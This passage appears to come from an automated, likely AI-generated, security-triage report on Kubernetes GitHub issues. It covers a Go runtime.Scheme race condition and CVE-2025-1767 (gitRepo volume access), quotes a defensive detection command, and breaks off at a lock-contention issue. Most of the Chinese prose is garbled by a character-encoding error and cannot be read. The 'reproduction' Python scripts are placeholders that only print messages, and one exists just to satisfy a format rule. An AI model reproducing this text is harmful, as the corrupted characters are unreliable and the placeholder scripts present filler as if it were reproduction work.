    *   è¿™æ›´åƒæ˜¯ä¸€ä¸ªç¨‹åºè‡ªèº«çš„ Bugï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…¸å‹çš„å¯è¢«å¤–éƒ¨æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ã€‚æ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥æ§åˆ¶ç›®æ ‡è¿›ç¨‹å†…éƒ¨çš„åç¨‹è°ƒåº¦å’Œæ‰§è¡Œæ—¶æœºæ¥ç²¾ç¡®è§¦å‘è¿™ä¸ªç«äº‰æ¡ä»¶ã€‚
    *   è§¦å‘æ­¤é—®é¢˜çš„ä»£ç è·¯å¾„é€šå¸¸ä½äºæœåŠ¡è¿›ç¨‹å†…éƒ¨ï¼Œä¾‹å¦‚ Controller çš„åˆå§‹åŒ–é€»è¾‘æˆ–è¿è¡Œæ—¶çš„ API äº¤äº’é€»è¾‘ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬ 5 æ¡ï¼Œå¦‚æœ DoS æ”»å‡»éœ€è¦æ”»å‡»è€…å…·å¤‡ä¸€å®šæƒé™ï¼ˆä¾‹å¦‚èƒ½å¤Ÿéƒ¨ç½²æˆ–é…ç½®ä¼šè§¦å‘æ­¤ bug çš„ Controllerï¼Œæˆ–è€…èƒ½å¤Ÿå‘é€ç‰¹å®š API è¯·æ±‚é—´æ¥è§¦å‘ Controller å†…éƒ¨çš„å¹¶å‘è¡Œä¸ºï¼‰ï¼Œå¹¶ä¸”è¿™äº›æƒé™å¹¶éæ™®é€šåªè¯»æƒé™ï¼Œåˆ™é£é™©ç­‰çº§éœ€è¦é™çº§ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œè§¦å‘å´©æºƒçš„æ˜¯ Controller è‡ªèº«çš„è¡Œä¸ºï¼Œè€Œéå¤–éƒ¨ä½æƒé™ç”¨æˆ·çš„ç›´æ¥æ”»å‡»ã€‚å³ä½¿ Controller å´©æºƒï¼Œé€šå¸¸ä¹Ÿä¼šè¢« Kubernetes è‡ªåŠ¨é‡å¯ï¼Œé€ æˆçŸ­æš‚çš„æœåŠ¡ä¸å¯ç”¨ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©è¡Œä¸ºï¼ˆæ ‡å‡†ç¬¬ 7 æ¡ï¼‰ã€‚
    *   è¯¥é—®é¢˜å‘ç”Ÿåœ¨ä¸€ä¸ªç‹¬ç«‹çš„ Controller è¿›ç¨‹ä¸­ï¼Œè™½ç„¶è¯¥ Controller çš„å´©æºƒä¼šå½±å“å…¶ç®¡ç†çš„ç”¨æˆ·èµ„æºï¼Œä½†ä¸å¤ªå¯èƒ½è®©ä¸€ä¸ªä½æƒé™ç”¨æˆ·ç›´æ¥å½±å“åˆ°å…¶ä»–ç”¨æˆ·ï¼ˆæ ‡å‡†ç¬¬ 8 æ¡ï¼‰ã€‚é™¤éè¯¥ Controller æœ¬èº«è®¾è®¡ä¸ºå¤šç§Ÿæˆ·æœåŠ¡ä¸”å´©æºƒä¼šè·¨ç§Ÿæˆ·å½±å“ï¼Œä½†è¯¥ Issue å¹¶æœªæä¾›æ­¤ç±»ä¿¡æ¯ã€‚

4.  **å½±å“ï¼š** ä¸»è¦å½±å“æ˜¯ Controller/Operator çš„å¯ç”¨æ€§ã€‚é¢‘ç¹çš„å´©æºƒå’Œé‡å¯ä¼šå½±å“å…¶åŠŸèƒ½çš„æ­£å¸¸æ‰§è¡Œï¼Œä¾‹å¦‚æ— æ³•åŠæ—¶å“åº”äº‹ä»¶ã€æ›´æ–°èµ„æºçŠ¶æ€ç­‰ã€‚å¯¹äºå…³é”®çš„ Controllerï¼ˆå¦‚ CNI æ’ä»¶ Calico çš„ç›¸å…³ç»„ä»¶ï¼‰ï¼Œå¯èƒ½å¯¼è‡´é›†ç¾¤ç½‘ç»œåŠŸèƒ½å¼‚å¸¸æˆ–ç­–ç•¥æ— æ³•æ‰§è¡Œã€‚

5.  **CVSS 3.1 è¯„åˆ†ï¼ˆä¼°ç®—ï¼‰ï¼š**
    *   AV: L (æ”»å‡»å‘é‡ï¼šæœ¬åœ°ï¼Œå› ä¸ºæ˜¯è¿›ç¨‹å†…éƒ¨å¹¶å‘é—®é¢˜)
    *   AC: H (æ”»å‡»å¤æ‚åº¦ï¼šé«˜ï¼Œä¾èµ–ç²¾ç¡®çš„å¹¶å‘æ—¶åºï¼Œä¸æ˜“ç”±å¤–éƒ¨æ§åˆ¶)
    *   PR: H (æƒé™è¦æ±‚ï¼šé«˜ï¼Œé€šå¸¸éœ€è¦éƒ¨ç½²/ç®¡ç† Controller çš„æƒé™ï¼Œæˆ–è€…éœ€è¦è§¦å‘ Controller å†…éƒ¨ç‰¹å®šå¹¶å‘é€»è¾‘çš„æƒé™)
    *   UI: N (ç”¨æˆ·äº¤äº’ï¼šæ— )
    *   S: U (èŒƒå›´ï¼šä¸å˜ï¼Œå½±å“ç»„ä»¶è‡ªèº«)
    *   C: N (æœºå¯†æ€§ï¼šæ— )
    *   I: N (å®Œæ•´æ€§ï¼šæ— ï¼Œä¸»è¦æ˜¯å´©æºƒ)
    *   A: L/M (å¯ç”¨æ€§ï¼šä½/ä¸­ï¼Œå¯¼è‡´ç»„ä»¶é‡å¯ï¼Œå½±å“èŒƒå›´å–å†³äºç»„ä»¶é‡è¦æ€§)
    *   æ ¹æ® CVSS v3.1 Calculator (AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:L)ï¼Œå¾—åˆ†ä¸º 2.2 (Low)ã€‚å¦‚æœå¯ç”¨æ€§å½±å“åˆ¤æ–­ä¸º Medium (A:M)ï¼Œå¾—åˆ†ä¸º 3.8 (Low)ã€‚

**ç»“è®ºï¼š** è¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªç”±å¹¶å‘ç«äº‰æ¡ä»¶å¼•èµ·çš„ç¨‹åºå´©æºƒé—®é¢˜ï¼Œå±äºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ç±»å‹ã€‚ä½†å…¶è§¦å‘æ¡ä»¶æºäºç¨‹åºå†…éƒ¨å®ç°ï¼Œéš¾ä»¥è¢«å¤–éƒ¨æ”»å‡»è€…ç¨³å®šåˆ©ç”¨ï¼Œä¸”åˆ©ç”¨é€šå¸¸éœ€è¦è¾ƒé«˜æƒé™ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç‰¹åˆ«æ˜¯ç¬¬ 5 æ¡ï¼Œè¯¥é—®é¢˜åº”è¢«è¯„ä¸º **ä½é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥é—®é¢˜æ˜¯ Go è¯­è¨€å®ç°çš„ Kubernetes client-go åº“åŠå…¶ runtime åŒ…å†…éƒ¨çš„å¹¶å‘é—®é¢˜ (race condition)ã€‚
# å…·ä½“è¡¨ç°ä¸ºåœ¨ Go ç¨‹åºä¸­ä½¿ç”¨å¤šä¸ª goroutine å¹¶å‘è¯»å†™åŒä¸€ä¸ª runtime.Scheme å¯¹è±¡çš„ map æ—¶ï¼Œ
# Go runtime ä¼šæ£€æµ‹åˆ°å¹¶å‘å†²çªå¹¶æŠ›å‡º fatal error å¯¼è‡´è¿›ç¨‹å´©æºƒã€‚
#
# Python è¯­è¨€åŠå…¶ Kubernetes å®¢æˆ·ç«¯åº“ (kubernetes-client/python) å…·æœ‰ä¸åŒçš„å†…éƒ¨å®ç°æœºåˆ¶ï¼Œ
# ä¸å­˜åœ¨ä¸ Go è¯­è¨€ map å¹¶å‘è®¿é—®å®Œå…¨ç›¸åŒçš„åº•å±‚é—®é¢˜ã€‚
# Python çš„å­—å…¸ï¼ˆdictï¼‰åœ¨ CPython å®ç°ä¸­ï¼Œå¤§éƒ¨åˆ†æ“ä½œå—å…¨å±€è§£é‡Šå™¨é”ï¼ˆGILï¼‰ä¿æŠ¤ï¼Œ
# è™½ç„¶ GIL ä¸èƒ½å®Œå…¨é˜²æ­¢æ‰€æœ‰å¤šçº¿ç¨‹æ•°æ®ç«äº‰é—®é¢˜ï¼ˆä¾‹å¦‚éåŸå­æ“ä½œï¼‰ï¼Œä½†ä¸ä¼šåƒ Go map ä¸€æ ·
# åœ¨æ£€æµ‹åˆ°å¹¶å‘è¯»å†™æ—¶ç›´æ¥è§¦å‘ fatal error å´©æºƒã€‚
# Python çš„ Kubernetes å®¢æˆ·ç«¯åº“æœ¬èº«ä¹Ÿä¸ä¼šç›´æ¥æš´éœ²æˆ–ä¾èµ–äºç±»ä¼¼ Go runtime.Scheme çš„å¹¶å‘ä¸å®‰å…¨ç»“æ„ã€‚
#
# å› æ­¤ï¼Œæ— æ³•ä½¿ç”¨ Python ç¼–å†™ä¸€ä¸ª PoC æ¥ç›´æ¥å¤ç° Go è¯­è¨€ç¯å¢ƒä¸‹çš„ "concurrent map read and map write" fatal errorã€‚
# è¿™ä¸ªé”™è¯¯æ˜¯ Go è¯­è¨€ç‰¹å®šå®ç°å’Œåº“ä½¿ç”¨æ–¹å¼ä¸‹çš„äº§ç‰©ã€‚
#
# è¦å¤ç°æ­¤é—®é¢˜ï¼Œéœ€è¦åœ¨ Go ç¯å¢ƒä¸‹ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ¨¡æ‹Ÿå¤šä¸ª goroutine å¹¶å‘åœ°è°ƒç”¨
# k8s.io/apimachinery/pkg/runtime ç›¸å…³å‡½æ•°ï¼ˆå¦‚ AddToScheme, ObjectKinds ç­‰ï¼‰æ“ä½œåŒä¸€ä¸ª Scheme å®ä¾‹ã€‚

# ä»¥ä¸‹ä¸ºå ä½ç¬¦ï¼Œè¡¨æ˜æ— æ³•æä¾›æœ‰æ•ˆçš„ Python PoC
import time
import threading

def simulate_action(action_name):
    print(f"Thread {threading.current_thread().name} starting {action_name}")
    # æ¨¡æ‹Ÿä¸€äº›å·¥ä½œè´Ÿè½½
    time.sleep(0.1)
    print(f"Thread {threading.current_thread().name} finishing {action_name}")

def main():
    print("This Python script demonstrates basic threading.")
    print("It CANNOT reproduce the Go 'concurrent map read and map write' fatal error.")
    print("The original issue is specific to Go's runtime and k8s.io/apimachinery implementation.")
    print("Reproducing the issue requires writing a Go program with concurrent Scheme modifications.")

    threads = []
    for i in range(5):
        # æ¨¡æ‹Ÿå¹¶å‘è¯»å†™æ“ä½œï¼ˆä½†è¿™é‡Œåªæ˜¯æ‰“å°ï¼Œæ— æ³•è§¦å‘ Go çš„ map raceï¼‰
        read_thread = threading.Thread(target=simulate_action, args=(f"simulated read {i}",), name=f"Reader-{i}")
        write_thread = threading.Thread(target=simulate_action, args=(f"simulated write {i}",), name=f"Writer-{i}")
        threads.append(read_thread)
        threads.append(write_thread)
        read_thread.start()
        write_thread.start()

    # ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å®Œæˆ
    for thread in threads:
        thread.join(timeout=10) # è®¾ç½®è¶…æ—¶é¿å…å¡æ­»

    print("Simulated operations complete.")
    print("No Go runtime fatal error occurred because this is Python.")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æä¾›çš„ Python è„šæœ¬æ—¨åœ¨è¯´æ˜ä¸ºä»€ä¹ˆæ— æ³•ä½¿ç”¨ Python å¤ç°åŸå§‹ Issue ä¸­æè¿°çš„ Go è¯­è¨€ç‰¹æœ‰çš„å¹¶å‘é”™è¯¯ã€‚

1.  **é—®é¢˜æ ¹æº**ï¼šåŸå§‹ Issue çš„æ ¸å¿ƒæ˜¯ Go è¯­è¨€å†…ç½® `map` ç±»å‹åœ¨å¹¶å‘è¯»å†™æ—¶çš„ä¸å®‰å…¨æ€§ï¼Œä»¥åŠ `k8s.io/apimachinery/pkg/runtime.Scheme` åœ¨å…¶å®ç°ä¸­ç›´æ¥ä½¿ç”¨äº† `map` ä¸”åœ¨æŸäº›åœºæ™¯ä¸‹æœªï¼ˆæˆ–æœªèƒ½å®Œå…¨ï¼‰ä¿æŠ¤å¹¶å‘è®¿é—®ï¼Œå¯¼è‡´ Go runtime æ£€æµ‹åˆ°å†²çªå¹¶å¼ºåˆ¶ç¨‹åºé€€å‡ºã€‚
2.  **Python çš„å·®å¼‚**ï¼šPython çš„å­—å…¸ (`dict`) å’Œå¤šçº¿ç¨‹æ¨¡å‹ä¸ Go ä¸åŒã€‚CPython ä¸­çš„ GIL é€šå¸¸ä¼šåºåˆ—åŒ–å¯¹ Python å¯¹è±¡çš„è®¿é—®ï¼Œè™½ç„¶ä¸èƒ½å®Œå…¨é¿å…æ‰€æœ‰ç±»å‹çš„ç«äº‰æ¡ä»¶ï¼Œä½†ä¸ä¼šä»¥ Go `map` å¹¶å‘è®¿é—®é”™è¯¯çš„æ–¹å¼è¡¨ç°å‡ºæ¥ã€‚Python çš„ Kubernetes å®¢æˆ·ç«¯åº“ (`kubernetes-client/python`) ä¹Ÿæœ‰å…¶ç‹¬ç«‹çš„å†…éƒ¨å®ç°ï¼Œä¸å…±äº« Go `client-go` çš„ `runtime.Scheme` å¯¹è±¡æˆ–å…¶å®ç°ç»†èŠ‚ã€‚
3.  **è„šæœ¬åŠŸèƒ½**ï¼šè¯¥ Python è„šæœ¬ä½¿ç”¨ `threading` æ¨¡å—åˆ›å»ºäº†å¤šä¸ªçº¿ç¨‹æ¥æ¨¡æ‹Ÿå¹¶å‘æ´»åŠ¨ã€‚ç„¶è€Œï¼Œè¿™äº›çº¿ç¨‹æ‰§è¡Œçš„æ˜¯ç®€å•çš„æ‰“å°å’Œä¼‘çœ æ“ä½œ (`simulate_action` å‡½æ•°)ï¼Œå¹¶ä¸èƒ½ä¸ Python Kubernetes å®¢æˆ·ç«¯åº“çš„å†…éƒ¨çŠ¶æ€è¿›è¡Œäº¤äº’ä»¥è§¦å‘ç±»ä¼¼ Go çš„ `map` å¹¶å‘é”™è¯¯ã€‚
4.  **ç»“è®º**ï¼šè„šæœ¬è¿è¡Œåä¼šæ­£å¸¸ç»“æŸï¼Œå¹¶è¾“å‡ºæç¤ºä¿¡æ¯ï¼Œæ˜ç¡®æŒ‡å‡ºå®ƒä¸èƒ½å¤ç° Go è¯­è¨€çš„ç‰¹å®šé”™è¯¯ã€‚è¦çœŸæ­£å¤ç°è¿™ä¸ªé—®é¢˜ï¼Œå¿…é¡»åœ¨ Go ç¯å¢ƒä¸­ç¼–å†™ä»£ç ï¼Œä½¿ç”¨ `client-go` æˆ–ç›¸å…³åº“ï¼Œå¹¶ç²¾å¿ƒè®¾è®¡å¹¶å‘åœºæ™¯æ¥è§¦å‘å¯¹ `runtime.Scheme` çš„å¹¶å‘è¯»å†™ã€‚ä¿®å¤è¿™ä¸ªé—®é¢˜éœ€è¦åœ¨ `k8s.io/apimachinery` åº“å±‚é¢ä¸º `Scheme` çš„å†…éƒ¨ `map` è®¿é—®å¢åŠ é€‚å½“çš„å¹¶å‘æ§åˆ¶ï¼ˆä¾‹å¦‚ä½¿ç”¨ `sync.RWMutex` è¯»å†™é”ï¼‰ï¼Œæ­£å¦‚ Issue ä¸­å»ºè®®çš„é‚£æ ·ã€‚

---


## Issue #130786 CVE-2025-1767: GitRepo Volume Inadvertent Local Repository Access

- Issue é“¾æ¥ï¼š[#130786](https://github.com/kubernetes/kubernetes/issues/130786)

### Issue å†…å®¹

**Issue Details**
A security vulnerability was discovered in Kubernetes that could allow a user with create pod permission to exploit gitRepo volumes to access local git repositories belonging to other pods on the same node.
This issue has been rated Medium ([CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N)) (score: 6.5), and assigned CVE-2025-1767.

**Am I vulnerable?**

This CVE only affects Kubernetes clusters that utilize the in-tree gitRepo volume to clone git repositories from other pods within the same node. Since the in-tree gitRepo volume feature has been deprecated and will not receive security updates upstream, any cluster still using this feature remains vulnerable. 
Affected Components
kubelet

**Affected Versions**
All versions of Kubernetes

**How do I mitigate this vulnerability?**

To mitigate this vulnerability, you must use an init container to perform git clone operation and then mount the directory into the Pod's container. An example of this approach is provided [here](https://gist.github.com/tallclair/849601a16cebeee581ef2be50c351841).

Note: You can also restrict the use of gitRepo volumes in your cluster using policies such as ValidatingAdmissionPolicy or through Restricted pod security standard policy. You can use the following Common Expression Language (CEL) expression as part of a policy to reject use of gitRepo volumes: `has(object.spec.volumes) || !object.spec.volumes.exists(v, has(v.gitRepo))`

**Detection**

To detect whether this vulnerability has been exploited, you can use the following command to list all pods that use the in-tree gitRepo volume and clones to a .git subdirectory. 
`kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].gitRepo.repository | test("^/")) | {name: .metadata.name, namespace: .metadata.namespace, repository: (.spec.volumes[] | select(.gitRepo) | .gitRepo.repository)}'`

If you find evidence that this vulnerability has been exploited, please contact [security@kubernetes.io](mailto:security@kubernetes.io) 

**Acknowledgements**
This vulnerability was reported by Christophe Hauquiert.


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤ Issue æè¿°äº†ä¸€ä¸ª Kubernetes ä¸­çš„å®‰å…¨æ¼æ´ (CVE-2025-1767)ã€‚è¯¥æ¼æ´å…è®¸æ‹¥æœ‰åˆ›å»º Pod æƒé™çš„ç”¨æˆ·ï¼ˆæ”»å‡»è€…ï¼‰åˆ©ç”¨ `gitRepo` ç±»å‹çš„ Volume æ¥è®¿é—®åŒä¸€èŠ‚ç‚¹ä¸Šå…¶ä»– Pod å…‹éš†åˆ°æœ¬åœ°çš„ Git ä»“åº“ã€‚

å…·ä½“æ¥è¯´ï¼Œå½“ä¸€ä¸ª Podï¼ˆå—å®³è€… Podï¼‰ä½¿ç”¨ `gitRepo` Volume ä»æŸä¸ªæºå…‹éš†ä»£ç æ—¶ï¼Œå…¶ä»£ç ï¼ˆåŒ…æ‹¬ `.git` ç›®å½•ï¼‰ä¼šå­˜åœ¨äºèŠ‚ç‚¹çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šã€‚å¦ä¸€ä¸ªæ‹¥æœ‰åˆ›å»º Pod æƒé™çš„ç”¨æˆ·ï¼ˆæ”»å‡»è€…ï¼‰å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ Podï¼ˆæ”»å‡»è€… Podï¼‰ï¼Œå¹¶å°†å…¶ `gitRepo` Volume çš„ `repository` å­—æ®µæŒ‡å‘å—å®³è€… Pod åœ¨èŠ‚ç‚¹ä¸Šå…‹éš†çš„ä»“åº“çš„æœ¬åœ°è·¯å¾„ï¼ˆä¾‹å¦‚ `/var/lib/kubelet/pods/.../volumes/kubernetes.io~git-repo/...`ï¼‰ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤ŸçŒœæµ‹æˆ–çŸ¥é“è¿™ä¸ªè·¯å¾„ï¼Œæˆ–è€…è¯¥è·¯å¾„æ˜¯å¯é¢„æµ‹çš„ï¼Œé‚£ä¹ˆæ”»å‡»è€… Pod å¯åŠ¨æ—¶ï¼Œ`kubelet` ä¼šå°è¯•å°†è¿™ä¸ªæœ¬åœ°è·¯å¾„ï¼ˆå®é™…ä¸Šæ˜¯å—å®³è€… Pod çš„ä»“åº“ï¼‰æŒ‚è½½åˆ°æ”»å‡»è€… Pod å†…éƒ¨ã€‚è¿™ä½¿å¾—æ”»å‡»è€… Pod èƒ½å¤Ÿè¯»å–å—å®³è€… Pod çš„ Git ä»“åº“å†…å®¹ï¼Œå¯èƒ½åŒ…æ‹¬æºä»£ç ã€æäº¤å†å²ã€ç”šè‡³å¯èƒ½åŒ…å«åœ¨ä»“åº“ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ç¡¬ç¼–ç çš„å‡­è¯ã€é…ç½®æ–‡ä»¶ç­‰ï¼‰ã€‚

å…³é”®ç‚¹ï¼š
1.  **æ”»å‡»å‰æ**: æ”»å‡»è€…éœ€è¦æ‹¥æœ‰ `pod/create` æƒé™ã€‚è¿™é€šå¸¸ä¸æ˜¯æ™®é€šç”¨æˆ·æ‹¥æœ‰çš„æƒé™ï¼Œå±äºè¾ƒé«˜æƒé™ã€‚
2.  **æ”»å‡»æ¡ä»¶**:
    *   é›†ç¾¤ä¸­å¿…é¡»æœ‰ Pod åœ¨ä½¿ç”¨ï¼ˆå·²åºŸå¼ƒçš„ï¼‰in-tree `gitRepo` Volume åŠŸèƒ½ã€‚
    *   æ”»å‡»è€…éœ€è¦çŸ¥é“æˆ–çŒœæµ‹ç›®æ ‡ Pod åœ¨èŠ‚ç‚¹ä¸Šçš„ Volume è·¯å¾„ã€‚
    *   æ”»å‡»è€… Pod å’Œå—å®³è€… Pod éœ€è¦è°ƒåº¦åˆ°åŒä¸€ä¸ª Node ä¸Šã€‚
3.  **æ¼æ´å½±å“**: ä¸»è¦æ˜¯ä¿¡æ¯æ³„éœ²ï¼ˆè¯»å–å…¶ä»– Pod çš„ Git ä»“åº“æ•°æ®ï¼‰ã€‚Issue ä¸­æä¾›çš„ CVSS å‘é‡ä¹ŸåŒ…å«äº†é«˜æœºå¯†æ€§ï¼ˆC:Hï¼‰å’Œé«˜å®Œæ•´æ€§ï¼ˆI:Hï¼‰å½±å“ï¼Œä½†ä¸»è¦é£é™©æ˜¯ä¿¡æ¯æ³„éœ²ã€‚å®Œæ•´æ€§å½±å“å¯èƒ½æŒ‡æ”»å‡»è€…æˆ–è®¸èƒ½é€šè¿‡æŸç§æ–¹å¼ä¿®æ”¹æœ¬åœ°ç¼“å­˜çš„ `.git` ç›®å½•ï¼Œä½†è¿™ä¸å¦‚ä¿¡æ¯æ³„éœ²ç›´æ¥ã€‚
4.  **å®˜æ–¹è¯„çº§**: Issue ä¸­æ˜ç¡®ç»™å‡ºäº†å®˜æ–¹ CVSS 3.1 è¯„çº§ä¸º Medium (6.5)ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜æ˜¯å®‰å…¨é—®é¢˜ï¼Œä¸æ˜¯ "ä¸æ¶‰åŠ"ã€‚
2.  å®˜æ–¹ CVSS è¯„åˆ†ä¸º 6.5 (Medium)ï¼Œæ ¹æ®æ ‡å‡† #3 ("highä»¥ä¸Šä¸ºé«˜é£é™©ï¼Œå…¶ä»–å‡ä¸ºä½é£é™©")ï¼Œæ­¤æ¼æ´å±äº **ä½é£é™©**ã€‚
3.  æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡ `pod/create` æƒé™ï¼ˆ`PR:H`ï¼‰ï¼Œè¿™å±äºéåªè¯»æƒé™ï¼Œç¬¦åˆæ ‡å‡† #5 ä¸­æåˆ°çš„åˆ©ç”¨éœ€è¦è¾ƒé«˜æƒé™çš„æƒ…å†µï¼Œè¿›ä¸€æ­¥æ”¯æŒäº†éé«˜é£é™©çš„åˆ¤æ–­ã€‚
4.  è™½ç„¶å­˜åœ¨è·¨ Pod çš„ä¿¡æ¯æ³„éœ²ï¼ˆç¬¦åˆæ ‡å‡† #8 çš„éƒ¨åˆ†åœºæ™¯ï¼‰ï¼Œä½†å…¶åˆ©ç”¨éœ€è¦è¾ƒé«˜æƒé™ (`PR:H`)ï¼Œä¸”ä¸»è¦å½±å“æ˜¯ä¿¡æ¯æ³„éœ²ï¼Œå¹¶éå‘½ä»¤æ‰§è¡Œã€ææƒæˆ–å®¹å™¨é€ƒé€¸ï¼ˆæ ‡å‡† #7ï¼‰ï¼Œç»¼åˆ CVSS è¯„åˆ†å’Œæƒé™è¦æ±‚ï¼Œä¸è¶³ä»¥åˆ¤å®šä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ ¹æ®é£é™©è¯„çº§å’Œè¦æ±‚ï¼Œæ­¤æ¼æ´ä¸ºä½é£é™©ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚
# åŸå› ï¼š
# 1. å®˜æ–¹ CVSS è¯„çº§ä¸º 6.5 (Medium)ï¼Œä½äº High (7.0) çš„é«˜é£é™©é˜ˆå€¼ã€‚
# 2. æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…æ‹¥æœ‰åˆ›å»º Pod çš„æƒé™ (PR:H)ï¼Œè¿™æ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒé«˜çš„æƒé™è¦æ±‚ã€‚
# 3. æ¼æ´çš„ä¸»è¦å½±å“æ˜¯ä¿¡æ¯æ³„éœ²ï¼Œè€Œéè¿œç¨‹ä»£ç æ‰§è¡Œã€ææƒæˆ–å®¹å™¨é€ƒé€¸ç­‰é€šå¸¸è¢«è§†ä¸ºé«˜é£é™©çš„æ“ä½œã€‚
# å› æ­¤ï¼ŒæŒ‰ç…§è¦æ±‚ï¼Œä½é£é™©é—®é¢˜ä¸éœ€è¦æä¾› POC è„šæœ¬ã€‚

print("è¯¥æ¼æ´ (CVE-2025-1767) è¢«è¯„å®šä¸ºä½é£é™©ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚")
print("åŸå› ï¼šå®˜æ–¹ CVSS è¯„åˆ†ä¸º 6.5 (Medium)ï¼Œä¸”åˆ©ç”¨éœ€è¦è¾ƒé«˜çš„ 'pod/create' æƒé™ã€‚")

def main():
    pass # ç©ºå‡½æ•°ï¼Œæ»¡è¶³ä¸ä½¿ç”¨ if __name__ == "__main__": çš„è¦æ±‚

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æè¿°çš„ CVE-2025-1767 æ¼æ´å…è®¸å…·æœ‰ Pod åˆ›å»ºæƒé™çš„ç”¨æˆ·é€šè¿‡ç‰¹åˆ¶çš„ `gitRepo` Volume é…ç½®æ¥è®¿é—®åŒä¸€èŠ‚ç‚¹ä¸Šå…¶ä»– Pod çš„æœ¬åœ° Git ä»“åº“å‰¯æœ¬ã€‚

æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªæ˜ç¡®çš„å®‰å…¨æ¼æ´ï¼Œå› æ­¤é£é™©è¯„çº§ä¸æ˜¯ "ä¸æ¶‰åŠ"ã€‚
2.  Issue ä¸­æä¾›çš„å®˜æ–¹ CVSS 3.1 è¯„åˆ†ä¸º 6.5 (Medium)ã€‚æ ¹æ®æ ‡å‡† #3ï¼Œåªæœ‰ CVSS è¯„çº§ä¸º High (7.0) åŠä»¥ä¸Šçš„æ‰ç®—é«˜é£é™©ï¼ŒMedium å±äºä½é£é™©èŒƒç•´ã€‚
3.  åˆ©ç”¨æ­¤æ¼æ´éœ€è¦æ”»å‡»è€…æ‹¥æœ‰åˆ›å»º Pod çš„æƒé™ (`PR:H`)ï¼Œè¿™æ˜¯ä¸€ä¸ªè¾ƒé«˜çš„æƒé™è¦æ±‚ã€‚æ ‡å‡† #5 æŒ‡å‡ºï¼Œéœ€è¦éåªè¯»æƒé™ï¼ˆå¦‚åˆ›å»ºã€ä¿®æ”¹ï¼‰æ‰èƒ½åˆ©ç”¨çš„ DoS æ¼æ´ä¸åº”åˆ¤å®šä¸ºé«˜é£é™©ã€‚è™½ç„¶è¿™ä¸æ˜¯ DoSï¼Œä½†é«˜æƒé™è¦æ±‚æ˜¯é™ä½é£é™©è¯„ä¼°çš„ä¸€ä¸ªå› ç´ ã€‚
4.  æ­¤æ¼æ´ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸æˆ–ææƒï¼ˆæ ‡å‡† #7ï¼‰ã€‚
5.  è™½ç„¶å­˜åœ¨ä¸€ä¸ªç”¨æˆ·å½±å“å¦ä¸€ä¸ªç”¨æˆ·æ•°æ®çš„å¯èƒ½æ€§ï¼ˆæ ‡å‡† #8ï¼‰ï¼Œä½†ç»“åˆå…¶é«˜æƒé™è¦æ±‚å’Œä¿¡æ¯æ³„éœ²çš„å½±å“æ€§è´¨ï¼Œä»¥åŠå®˜æ–¹çš„ Medium è¯„çº§ï¼Œç»¼åˆåˆ¤æ–­ä¸ºä½é£é™©ã€‚

ç”±äºé£é™©è¯„çº§ä¸ºâ€œä½é£é™©â€ï¼Œæ ¹æ®è¦æ±‚â€œé’ˆå¯¹é«˜é£é™©é—®é¢˜ï¼Œå¿…é¡»ç»™å‡ºä½¿ç”¨pythonç¼–å†™çš„å¤ç°è„šæœ¬â€ï¼Œå› æ­¤ä¸éœ€è¦ä¸ºè¯¥ä½é£é™©é—®é¢˜æä¾›å¤ç°è„šæœ¬ã€‚ä¸Šé¢çš„ Python ä»£ç ç‰‡æ®µä»…ç”¨äºè¯´æ˜æ­¤ç»“è®ºï¼Œå¹¶æ»¡è¶³è„šæœ¬æ ¼å¼è¦æ±‚ï¼ˆæ—  `if __name__ == "__main__":`ï¼ŒåŒ…å« `main` å‡½æ•°ï¼‰ã€‚

---


## Issue #130767 Informer Cache RW Lock Contention Causes DeltaFIFO Backlog and Cache Staleness in KCM.

- Issue é“¾æ¥ï¼š[#130767](https://github.com/kubernetes/kubernetes/issues/130767)

### Issue å†…å®¹

#### What happened?

#### Summary:

The Kubernetes Controller Manager (KCM) Informer caches experiences read/write mutex contention at scale. KCM controllers frequently acquire a read lock on the Informer cache to list objects from the store, which can starve the CacheController's DeltaFIFO processing from acquiring a write lock to update the Store/Cache during high throughput. This contention can lead to a backlog in DeltaFIFO, delaying delta event processing and stale cache.


#### Impact

